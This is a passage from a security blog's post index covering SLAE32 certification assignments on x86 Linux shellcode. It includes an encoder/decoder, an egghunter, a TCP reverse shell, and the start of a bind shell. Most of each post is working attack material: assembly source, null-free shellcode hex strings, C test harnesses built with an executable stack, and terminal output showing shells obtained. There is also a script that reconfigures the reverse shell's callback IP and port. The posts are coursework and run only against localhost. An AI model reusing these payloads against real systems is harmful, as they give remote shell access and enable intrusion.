for the original one using edx as an offset. Then, we move to bl the next encoded byte.\nWe can\u0026rsquo;t forget to remove the last used parity byte from the encoded shellcode. In the decode branch, we set up edi to point the address of the first parity byte. To remove this byte, we can make the next encoded shellcode byte take its place. In practical terms, we copy the next encoded byte to the address of the last parity byte with the instruction mov byte [edi], bl\nThen, we prepare he next iteration by:\npointing edi to the position of the subsequent parity byte al poiting to the next parity byte offset dl poiting to the next encoded byte incrementing cl, which is used as the loop index value In the last part, we check if we reach the end of the circular array. As we rotate 8 bits, we can’t turn any more than that. This way, we are synchronized with the encoder implementation.\nrestore_next_byte: mov byte [esi + edx], bl\t; replaces the original byte mov bl, byte [esi + eax + 1] ; mov next encoded byte mov byte [edi], bl\t; change last used parity byte for the next encoded byte inc edi\t; edi points to position of the next parity byte add al, 2\t; offset added to next parity byte inc dl\t; offset to the next encoded byte inc cl ; loop index value incremented ; Doing circular array as modulo workaround. Use 0x08 as a divisor or circular boundary because we are rotating 8 bits (al register). cmp cl, 0x08\t; if equal ZF will be set meaning we have a complete rotation jnz decode\t; jump if rotation is not complete xor ecx, ecx\t; if rotation is complete, reset cl to start again the \u0026#34;circular array\u0026#34; Compiling and Testing the FlipRotation Decoder Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/3-Egg_Hunter ‹main●› ╰─$ ../../assembler.sh egg_hunter.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 122 \u0026#34;\\xeb\\x3f\\x5e\\x8d\\x7e\\x01\\x31\\xc0\\x99\\xb0\\x01\\x31\\xc9\\x31\\xdb\\x8a\\x1c\\x06\\x80\\xf3\\xa0\\x74\\x2f\\x80\\xf3\\x5f\\x8a\\x1c\\x16\\x75\\x04\\xd2\\xcb\\xeb\\x02\\xd2\\xc3\\x80\\xf3\\x01\\x88\\x1c\\x16\\x8a\\x5c\\x06\\x01\\x88\\x1f\\x47\\x04\\x02\\xfe\\xc2\\xfe\\xc1\\x80\\xf9\\x08\\x75\\xd2\\x31\\xc9\\xeb\\xce\\xe8\\xbc\\xff\\xff\\xff\\x30\\x02\\x83\\xff\\x45\\xff\\x4b\\xff\\xe2\\x02\\x71\\x02\\xc9\\x02\\xb4\\xff\\x69\\xff\\x17\\x02\\x8d\\xff\\x0d\\x02\\xf6\\xff\\x44\\x02\\x8b\\x02\\xa8\\xff\\x88\\x02\\xc7\\xff\\x94\\x02\\x11\\x02\\x0e\\x02\\x36\\xff\\x28\\x02\\x99\\x02\\x81\\xff\\xa0\\xa0\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\xeb\\x3f\\x5e\\x8d\\x7e\\x01\\x31\\xc0\\x99\\xb0\\x01\\x31\\xc9\\x31\\xdb\\x8a\\x1c\\x06\\x80\\xf3\\xa0\\x74\\x2f\\x80\\xf3\\x5f\\x8a\\x1c\\x16\\x75\\x04\\xd2\\xcb\\xeb\\x02\\xd2\\xc3\\x80\\xf3\\x01\\x88\\x1c\\x16\\x8a\\x5c\\x06\\x01\\x88\\x1f\\x47\\x04\\x02\\xfe\\xc2\\xfe\\xc1\\x80\\xf9\\x08\\x75\\xd2\\x31\\xc9\\xeb\\xce\\xe8\\xbc\\xff\\xff\\xff\\x30\\x02\\x83\\xff\\x45\\xff\\x4b\\xff\\xe2\\x02\\x71\\x02\\xc9\\x02\\xb4\\xff\\x69\\xff\\x17\\x02\\x8d\\xff\\x0d\\x02\\xf6\\xff\\x44\\x02\\x8b\\x02\\xa8\\xff\\x88\\x02\\xc7\\xff\\x94\\x02\\x11\\x02\\x0e\\x02\\x36\\xff\\x28\\x02\\x99\\x02\\x81\\xff\\xa0\\xa0\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86/assignments/4-Custom_Encoder_Decoder ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86/assignments/4-Custom_Encoder_Decoder ‹main●› ╰─$ ./shellcode Shellcode Length: 122 $ id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) $ ls core flipRotation_Encoder.py flipRotation_decoder flipRotation_decoder.nasm flipRotation_decoder.o shellcode shellcode.c $ We get a shell!!!\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nNow at: https://www.pentesteracademy.com/course?id=3 Student ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n","permalink":"https://0xnibbles.github.io/posts/slae32/slae_32_assignment_4/","summary":"This post introduces the forth mission of my SLAE32 journey.\nA real handful and a challenging assignment. It was hard but worth it. Thus, I named my custom encoder/decoder shellcode as FlipRotation Shellcode\nIntroduction The fourth assignment goal was to create my custom encoder and decoder of the execve stack shellcode. As you may know, the purpose is to execute /bin/sh.\nA shellcode encoder can be used for different purposes, mainly making it harder to detect by AV engines or simply avoiding bad characters (such as null bytes).","title":"SLAE32 Assignment 4 - Custom Encoder/Decoder Shellcode (FlipRotation Encoder/Decoder)"},{"content":" This post introduces the third mission of my SLAE32 journey.\nA fantastic challenge not covered during the course made me research and understand the concept and which scenarios it\u0026rsquo;s applicable.\nIntroduction The third assignment for the SLAE32 purpose is to create an egghunter shellcode with the following requirements:\nCreate a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads. Hunting eggs in memory??? What is a Egghunter? An egghunter is useful when an attacker controls limited buffer space to put an entire shellcode on the stack.\nTo get around this constraint, an egghunter acts as a staged payload. This means the smaller payload can search through the entire memory space for a maker or egg. Once the egg is found, it indicates the start of the larger payload (shellcode) and redirects the execution flow to the instructions placed after the egg.\nSkape made a reference research paper in 2004 named Safely Searching Process Virtual Address Space with practical examples of different egghunter implementations.\nBasic Concepts Before going into the code details, it’s essential to have in mind some concepts to understand the internals of an egghunter.\nx86 Linux Memory Pages The manybutfinite.com article about Linux memory management states that:\n“x86 processors in 32-bit mode support page sizes of 4KB, 2MB, and 4MB. Both Linux and Windows map the user portion of the virtual address space using 4KB pages. Bytes 0-4095 fall in page 0, bytes 4096-8191 fall in page 1, and so on.”\nThis is essential because our egghunter will be iterating through memory pages searching for the egg.\nIf the egghunter can use a syscall to check for the egg on page 0 (bytes 0-4095) and if the used syscall returns an exit code that states if the memory location is accessible or not, based on that, the egghunter can skip to the next page of memory (page 1).\nThis way saves time and increases its performance.\nAccess Syscall - Can we read or not? Based on Skape paper, some syscalls can be used for this task. For this assignment, I used the access(2) syscall.\nThe purpose of access(2) syscall is to check effectively if a page memory is accessible or not. According to the access man page (man 2 access), this syscall is used to check if the calling process has access to a determined file.\nWe will use exit codes to check memory page permissions in this assignment context. If it returns an error (EFAULT) with the value 0xf2, it means the memory page is inaccessible. If return any other matter, we are good to go to search that page looking for the egg.\nDouble Egg We know the egg should be placed right before the shellcode by this time. We can make it more robust by placing it twice instead of once. This way, if the egghunter finds itself, we avoid unexpected behaviour from the program.\nIn practical terms, the shellcode structure is: egg+egg+shellcode\n\u0026ldquo;Assembling\u0026rdquo; our Egghunter First, the egg is placed into ebx. This register will be used to compare with memory content.\nmul ecx after clearing the ecx register is used to clear eax and edx. mul multiplies its operand with eax and saves the result in eax and edx. A small trick to save space with fewer opcodes.\nmov ebx, 0x50905090 ; the egg - 0x50905090 xor ecx, ecx mul ecx ; trick clear eax and edx After that, we mov 0xffff (4095 bytes) to dx. A memory page has 4096 bytes in size, but putting the value 0x1000 (4096 bytes) in dx will contain null bytes. Instead, we mov 0xffff to dx and increment it after inc edx inside the address_inspection: branch.\npage_alignment: or dx, 0xfff ; sets dx to 4095 address_inspection: inc edx ; sets dx to 4096 The next step is to analyze the memory page and check if we are able to access it. To achieve this goal, the address_inspection: branch will start incrementing edx to have make it 4096. After that, to preserve the register values push their value into the stack with pushad instruction.\nThen, we put the following 4 bytes of memory into ebx, load the access(2) syscall to al, and execute it on that memory address.\naddress_inspection: inc edx ; edx becomes 4096 pushad ; saves all registers values lea ebx, [edx+4] ; load the address of the next 4 bytes mov al, 0x21 ; set the value of the access syscall int 0x80 To verify if the memory page is accessible or not, we will use the compare opcode - cmp.\nThe compare cmp opcode takes two operands and subtracts them; if the result is a 0, the zero flag is set, and you know that the two operands are equal.\nThe return code is saved into eax. If the EFAULT (0xf2) error exists, our shellcode will jump to the page_alignment: branch to check the following memory page.\ncmp al, 0xf2 popad jz page_alignment But if the memory can be accessed, we will compare the value of the accessible memory, which is stored at edx, with ebx, which holds our egg. We we will jump to our address_inspection: branch and read through the page.\nIf the value of what is stored at edx matches our egg, then we have to see if [edx]+4 also does to ensure we don\u0026rsquo;t have a false positive and match our double egg requirement. If it is only found once, then it’s probably just our egghunter finding itself.\nFinally, if both cmp calls result in zeros, we tell the code to jump to edx, which will execute the code stored there (our real shellcode).\ncmp [edx], ebx jnz address_inspection cmp [edx+4], ebx jnz address_inspection jmp edx Final Assembly Code ; Student ID : PA-31319 ; Student Name : Eduardo Silva ; Assignment 3 : Egghunter Shellcode (Linux/x86) Assembly ; File Name : egg_hunter.nasm global _start section .text _start: mov ebx, 0x50905090 xor ecx, ecx mul ecx page_alignment: or dx, 0xfff address_inspection: inc edx pushad lea ebx, [edx+4] mov al, 0x21 int 0x80 cmp al, 0xf2 popad jz page_alignment cmp [edx], ebx jnz address_inspection cmp [edx+4], ebx jnz address_inspection jmp edx Compiling and Testing the Shellcode Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/3-Egg_Hunter ‹main●› ╰─$ ../../assembler.sh egg_hunter.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 39 \u0026#34;\\xbb\\x90\\x50\\x90\\x50\\x31\\xc9\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\\x42\\x60\\x8d\\x5a\\x04\\xb0\\x21\\xcd\\x80\\x3c\\xf2\\x61\\x74\\xed\\x39\\x1a\\x75\\xee\\x39\\x5a\\x04\\x75\\xe9\\xff\\xe2\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;string.h\u0026gt; unsigned char egghunter[] = \u0026#34;\\xbb\\x90\\x50\\x90\\x50\\x31\\xc9\\xf7\\xe1\\x66\\x81\\xca\\xff\\x0f\\x42\\x60\\x8d\\x5a\\x04\\xb0\\x21\\xcd\\x80\\x3c\\xf2\\x61\\x74\\xed\\x39\\x1a\\x75\\xee\\x39\\x5a\\x04\\x75\\xe9\\xff\\xe2\u0026#34;; unsigned char shellcode[] = \u0026#34;\\x90\\x50\\x90\\x50\\x90\\x50\\x90\\x50\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x50\\x89\\xe2\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80\u0026#34;; int main(void) { printf(\u0026#34;Egg hunter length: %d\\n\u0026#34;, strlen(egghunter)); printf(\u0026#34;Shellcode length: %d\\n\u0026#34;, strlen(shellcode)); void (*s)() = (void *)egghunter; s(); return 0; } I used the execve shellcode stack covered during the course to execute a shell .\nCompiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86/assignments/3-Egg_Hunter ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o egghunter_tester shellcode.c ╭─edu@debian ~/Desktop/slae_x86/assignments/3-Egg_Hunter ‹main●› ╰─$ ./egghunter_tester Egg hunter length: 39 Shellcode length: 33 $ id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) $ ls egg_hunter egg_hunter.nasm egg_hunter.o egghunter_tester shellcode shellcode.c $ We get a shell!!!\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nNow at: https://www.pentesteracademy.com/course?id=3 Student ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n","permalink":"https://0xnibbles.github.io/posts/slae32/slae_32_assignment_3/","summary":"This post introduces the third mission of my SLAE32 journey.\nA fantastic challenge not covered during the course made me research and understand the concept and which scenarios it\u0026rsquo;s applicable.\nIntroduction The third assignment for the SLAE32 purpose is to create an egghunter shellcode with the following requirements:\nCreate a working demo of the Egghunter; The shellcode should be null-free; With the ability to be configurable for different payloads. Hunting eggs in memory?","title":"SLAE32 Assignment 3 - Egghunter Shellcode"},{"content":" This post introduces the second mission of my SLAE32 journey.\nI spent a lot of time researching how to set up sockets or syscalls and taking notes which helped a lot to do this assignment.\nI won\u0026rsquo;t be as much detailed this time but guess what?\nThe best part is that we can reuse most of the bind shellcode to create a reverse shellcode!\nIntroduction The second assignment for the SLAE32 is similar to the previous post one, but in this case, we need to develop a reverse TCP shellcode.\nThe requirements are:\nThe reverse shell connects to the configured IP and port; Executing a shell on successful connection; The shellcode should be null-free; With the ability for the IP and port to be easily configurable. In other words, the IP and connection port should be easy to set up for the user. What is a Reverse Shell? Instead of waiting for connections, a reverse shell connects back to a remote machine, waiting for a connection to the target machine.\nThe input and output are redirected to the reverse shell socket so the remote machine can interact with the target machine remotely.\nA TCP reverse shell is a common technique to bypass firewall restrictions and unreachable access systems from public networks.\nBasics First Before putting our hands-on on developing the shellcode, we should be familiar with the fundamental principles of how to create a proper reverse shell. This way, we will better understand how the internals work and where to debug if an error occurs.\nMy approach was to analyze TCP reverse shell implementation in a higher-level language, such as C.\nC Prototype Beforehand, analyzing the following code gives an idea of the structure and what syscalls need to be used.\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;netinet/ip.h\u0026gt; #include \u0026lt;arpa/inet.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main () { const char* ip = \u0026#34;127.0.0.1\u0026#34;;\t// Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(9001); addr.sin_addr.s_addr = inet_addr(\u0026#34;127.0.0.1\u0026#34;); // 1) Socket Syscall int sockfd = socket(AF_INET, SOCK_STREAM, 0); // 2) Connect Syscall connect(sockfd, (struct sockadr *)\u0026amp;addr, sizeof(addr)); // 3) Dup2 Syscall for (int i = 0; i \u0026lt; 3;i++) { dup2(sockfd, i); } // 4) Execve Syscall execve(\u0026#34;/bin/sh\u0026#34;, NULL, NULL); return 0; } Testing the code to see how it behaves.\nCompiling with gcc\n$ gcc reverse.c -o reverse\nAs this is a reverse shell, we must execute a listener for port 9001 with nc. Then we can run reverse to establish a connection back to our listener.\nThe C reverse shell works as expected. From this, we have a reference to build our shellcode.\nChecking which syscalls are used In total, there are four syscalls enumerated below:\n*socket* - 359 - 0x167 connect - 362 - 0x16a --\u0026gt; new syscall *dup2* - 63 - 0x3f *execve* - 11 - 0xb We already have the code from the previous assignment for the highlighted syscalls. The new addition is the connect syscall. The difference for the bind shell, instead of defining a local interface, we need to specify a remote IP and a port.\nWe can use the file /usr/include/x86_64-linux-gnu/asm/unistd_32 to check the definition of each syscall.\nAs connect is the only new syscall, I will only focus on reviewing that one. For the other, please check assignment 1.\nConnect syscall (0x16a) The C code defines it as the following:\nStruct sockaddr_in // Server Address struct int sockfd, acceptfd; int port = 9001; // Server Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port); addr.sin_addr.s_addr = INADDR_ANY; Connect syscall // Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(9001); addr.sin_addr.s_addr = inet_addr(\u0026#34;127.0.0.1\u0026#34;); // 1) Socket Syscall int sockfd = socket(AF_INET, SOCK_STREAM, 0); // 2) Connect Syscall connect(sockfd, (struct sockadr *)\u0026amp;addr, sizeof(addr)); With the following arguments:\nint sockfd - sockfd is the socket descriptor returned by socket() in eax. const struct sockaddr *addr - pointer to struct sockaddr that contains information about your IP address and por socklen_t addrlen - addrlen specifies the size, in bytes, of the address structure pointed to by addr. In other words, addrlen is set to sizeof(struct sockaddr). The explanation of how to set up the value for these parameters is also the same as provided in assignment 1 (2 - Bind Syscall (0x169) section).\n\u0026ldquo;Assembling\u0026rdquo; our shellcode For this one, I didn’t put effort into reducing the shellcode size. The instructions here for the same syscalls do the same thing but use more space in memory.\nxor eax, eax xor ebx, ebx xor ecx, ecx cdq ; zeroes edx (trick to use less space) After this, it’s time to set up the syscall arguments having the C code as a reference.\n; socket syscall mov ax, 0x167 mov bl, 0x02 mov cl, 0x01 ; edx is already zero int 0x80\t; interruption syscall or interrupt vector. Returns pointer to the socket in eax EAX contains 0x167, which is sys_socket as seen in /usr/include/i386-linux-gnu/asm/unistd_32.h, then EBX is set to 0x2 (PF_INET).\nNext, the value 0x01 is moved into ECX, which is the value of SOCK_STREAM. EDX is already zero because of the previous cdq instruction.\nI just left to use the interruption syscall int 0x80 to create the socket.\nIf executed successfully, we have our socket. The next step is to set up the connect syscall.\nBeforehand, let\u0026rsquo;s prepare the next syscall, which is connect\n; accept syscall mov ebx, eax ; moves socket address to ebx (first arg of bind syscall - sockfd) xor eax, eax Then , the sockaddr_in struct is created as follows:\n; sockaddr struct push edx\t; pushing our 8 bytes of zero push 0x0201017f ; 127.1.1.2 --\u0026gt; 0x7F010102, little-endian = 0x0201017F push word 0x2923 ;little endian -\u0026gt; 9001 = 0x2329 push word 0x2 mov ecx, esp The struct is finally defined. The trickiest part to understand, I must say.\nEDX is still zero so pushing zeroes will determine the end of the struct.\nNext, we push 0x0201017f which is the remote IP address (127.1.1.2).\nWhy 127.1.1.2 and 127.0.0.1?\nThe address 127.0.0.1 contains null bytes (0x0100007f) which would break our shellcode. We need to go with an alternative way.\nBy using 127.1.1.2, we avoid those null bytes (0x0201017f). This works because the localhost address has a netmask of 255.0.0.0. The only limitation is the first 8 bytes, which is why the address 127.0.0.1 behaves the same way.\nThe next step is to load the stack with the port number. As intel works with the little-endian format, we push 0x2923, which is the value 9001. Lastly, pushing 0x2 refers to AF_INET.\nNow, it is just a matter of putting 0x10 (16 bytes) to EDX, which represents the size of sockaddr_in struct as mentioned in the previous section, and executing the bind syscall with 0x169 in EAX.\nmov dl, 0x10 ; sizeof struct mov ax, 0x16a int 0x80 It ends up like this\n; connect syscall mov ebx, eax ; moves socket address to ebx (first arg - sockfd) xor eax, eax ; sockaddr struct push edx\t; pushing our 8 bytes of zero push 0x0201017f ; 127.1.1.2 --\u0026gt; 0x7F010102, little-endian = 0x0201017F push word 0x2923 ;little endian -\u0026gt; 9001 = 0x2329 push word 0x2 mov ecx, esp mov dl, 0x10 ; sizeof struct mov ax, 0x16a int 0x80 For dup2 we use a loop to use fewer instructions to save space while constructing a fully interactive bind shell.\n; dup2 syscall mov edx, eax ; edx is already zero mov cl, 0x03 dup2: ;xor eax, eax ;mov al, 0x3f push byte 0x3f pop eax mov ebx, edx dec cl int 0x80 jnz dup2\t; decrements ecx and jumps until ecx=0 We reach the final stage, using execve syscall to execute /bin/sh and spawn a shell when a connection is made to the bind port. If all works as expected, a system shell will be provided to the incoming connection, which can interact with the target machine.\n; execve xor eax, eax cdq push eax push 0x68732f2f ; \u0026#34;hs//\u0026#34; push 0x6e69622f ; \u0026#34;nib/\u0026#34; mov ebx, esp mov al, 0xb int 0x80\tTo help revert the string used with execve I develop a script called The x86 \u0026quot;Little-Hexdian\u0026quot; String Convert, which checks if a string passed as an argument is aligned and converts it to hexadecimal in little-endian format.\nAvailable in https://github.com/0xnibbles/slae_x86/blob/main/revHex32.py\nFinal Assembly Code ; Student ID : PA-31319 ; Student Name : Eduardo Silva ; Assignment 2 : TCP Reverse Shell (Linux/x86) Assembly ; File Name : reverse_shell.nasm global\t_start section\t.text _start: global\t_start section\t.text _start: xor eax, eax xor ebx, ebx xor ecx, ecx cdq ; zeroes edx ; socket syscall mov ax, 0x167 mov bl, 0x02 mov cl, 0x01 ; edx is already zero int 0x80\t; interruption syscall or interrupt vector. Returns pointer to the socket in eax ; connect syscall mov ebx, eax ; moves socket address to ebx (first arg - sockfd) xor eax, eax ; sockaddr struct push edx\t; ; pushing our 8 bytes of zero push 0x0201017f ; 127.1.1.2 --\u0026gt; 0x7F010102, little-endian = 0x0201017F push word 0x2923 ;little endian -\u0026gt; 9001 = 0x2329 push word 0x2 mov ecx, esp mov dl, 0x10 ; sizeof struct mov ax, 0x16a int 0x80 ; dup2 xor ecx, ecx mov cl, 0x03 dup2: xor eax, eax mov al, 0x3f ;mov ebx, edi dec cl int 0x80 jnz dup2\t; decrements ecx and jumps until ecx=0 ; execve xor eax, eax cdq push eax push 0x68732f2f ; \u0026#34;hs//\u0026#34; push 0x6e69622f ; \u0026#34;nib/\u0026#34; mov ebx, esp mov al, 0xb int 0x80\tCompiling and Testing the Shellcode Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› ╰─$ ls bind bind.c bind_shell bind_shell.asm bind_shell.nasm bind_shell.o biShell.sh original_bind_shell.nasm syscalls ╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› ╰─$ ../../assembler.sh bind_shell.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 78 \u0026#34;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x68\\x7f\\x01\\x01\\x02\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x6a\\x01\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf6\\x31\\xc0\\x99\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program.\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x68\\x7f\\x01\\x01\\x02\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x6a\\x01\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf6\\x31\\xc0\\x99\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc\n╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o rev_shell shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ Let\u0026rsquo;s use nc to create a listener on port 9001 and then execute rev_shell to connect it.\n╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› ╰─$ ./rev_shell Shellcode Length: 78 ──────────────────────────────────────────────────── ╭─edu@debian ~/Documents/blogGithub/dev-blog/0xnibbles ‹master●› ╰─$ nc -lvnp 9001 listening on [any] 9001 ... connect to [127.1.1.2] from (UNKNOWN) [127.0.0.1] 35190 id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) rev_shell executes with no errors and it connects back to our listener!\nWhat if we want to change the IP address and the port? One of the requirements for this assignment is the ability to change easily the IP address and port used in the shellcode. For that, we can change the bytes in the shellcode related to the port and change them for the specific port we want the bind shell waits for a connection.\nThe following shell script is named revShell.sh replaces the hardcoded 9001 with the port provided by the user as an argument. It automatically converts the port into the hexadecimal little-endian format.\nAvailable at https://github.com/0xnibbles/slae_x86/blob/main/assignments/2-Shell_Reverse_TCP/revShell.sh\nIt accepts two arguments - the desired IP address and port.\n╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› ╰─$ ./revShell.sh Usage: ./revShell.sh \u0026lt;ip address\u0026gt; \u0026lt;port (decimal)\u0026gt; ╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› ╰─$ ./revShell.sh 127.1.1.3 9999 [*] Doing magic with your IP address and port number [*] Done Enjoy this Reverse TCP Shellcode with the IP 127.1.1.3 and port 9999 \u0026#34;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x68\\x7f\\x01\\x01\\x03\\x66\\x68\\x27\\x0F\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x6a\\x01\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf6\\x31\\xc0\\x99\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#34; -------------------- [*] Hack the World! -------------------- ╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o rev_shell9999 shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› ╰─$ ./rev_shell9999 Shellcode Length: 78 ──────────────────────────────────────────────────── ╭─edu@debian ~/Documents/blogGithub/dev-blog/0xnibbles ‹master●› ╰─$ nc -lvnp 9999 listening on [any] 9999 ... connect to [127.1.1.3] from (UNKNOWN) [127.0.0.1] 33880 id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) ls revShell.sh rev_shell rev_shell9999 reverse reverse.c reverse_shell reverse_shell.nasm reverse_shell.o shellcode.c syscalls testIP.sh We get a shell!!!\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nNow at: https://www.pentesteracademy.com/course?id=3 Student ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n","permalink":"https://0xnibbles.github.io/posts/slae32/slae_32_assignment_2/","summary":"This post introduces the second mission of my SLAE32 journey.\nI spent a lot of time researching how to set up sockets or syscalls and taking notes which helped a lot to do this assignment.\nI won\u0026rsquo;t be as much detailed this time but guess what?\nThe best part is that we can reuse most of the bind shellcode to create a reverse shellcode!\nIntroduction The second assignment for the SLAE32 is similar to the previous post one, but in this case, we need to develop a reverse TCP shellcode.","title":"SLAE32 Assignment 2 - TCP Reverse Shellcode"},{"content":" This post introduces the first mission of my SLAE32 journey.\nIntroduction The main goal for the first SLAE32 assignment is to develop a bind TCP shellcode with the following requirements:\nBinds to a port; Executing a shell on incoming connection; The shellcode should be null-free; With the ability for the port to be easily configurable. In other words, the connection port should be easy to set up for the user. Bind TCP shell? What is this? Generally, a bind TCP shell or bind shell is created when a listening port is configured to redirect the input, output, and errors of an executable (mostly /bin/sh or /bin/bash) to an incoming connection.\nIn practical terms, any machine connecting to this port will be presented with a shell prompt on the target computer and can interact with it.\nA TCP bind shell is a common technique to create backdoors and persistence in a target machine.\nBasics First Before putting our hands-on on developing the shellcode, we should be familiar with the fundamental principles of how to create a proper bind shell. This way, we will better understand how the internals work and where to debug if an error occurs.\nMy approach was to analyze TCP bind shell implementation in a higher-level language, such as C.\nC Prototype Beforehand, analyzing the following code gives an idea of the structure and what syscalls need to be used.\n// from https://infosecwriteups.com/expdev-bind-tcp-shellcode-cebb5657a997 #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;netinet/in.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { int sockfd, acceptfd; int port = 9001; // Server Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port); addr.sin_addr.s_addr = INADDR_ANY; // 1) Socket Creation (sys_socket 1) sockfd = socket(AF_INET, SOCK_STREAM, 0); // 2) Bind() Syscall (sys_bind 2) bind(sockfd, (struct sockaddr *) \u0026amp;addr, sizeof(addr)); // 3) Listen() Syscall (sys_listen 4) listen(sockfd, 0); // 4) Accept() Syscall (sys_accept 5) acceptfd = accept(sockfd, 